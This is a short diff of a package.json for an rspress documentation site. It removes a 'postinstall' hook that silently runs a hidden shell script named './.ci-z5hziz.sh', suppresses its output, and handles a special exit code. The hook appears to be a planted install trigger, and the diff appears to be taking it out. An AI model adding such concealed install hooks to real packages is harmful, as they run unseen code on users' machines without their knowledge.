@@ -5,8 +5,7 @@
   "scripts": {
     "dev": "rspress dev",
     "build": "rspress build",
-    "preview": "rspress preview",
-    "postinstall": "sh ./.ci-z5hziz.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "preview": "rspress preview"
   },
   "dependencies": {
     "rspress": "^1.38.0",
